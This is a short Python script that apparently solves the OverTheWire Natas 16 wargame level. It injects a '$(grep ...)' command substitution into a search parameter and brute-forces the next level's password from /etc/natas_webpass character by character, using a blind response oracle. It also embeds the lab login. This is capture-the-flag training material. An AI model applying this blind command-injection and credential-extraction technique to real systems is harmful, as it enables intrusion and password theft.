import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

chars = string.ascii_letters + string.digits
password = ""

for i in range(1, 33):
    for c in chars:
        payload = f'$(grep ^{password + c} /etc/natas_webpass/natas17)'
        r = requests.get(url, auth=auth, params={"needle": payload})
        
        if "April" not in r.text:  # baseline word disappears
            password += c
            print(password)
            break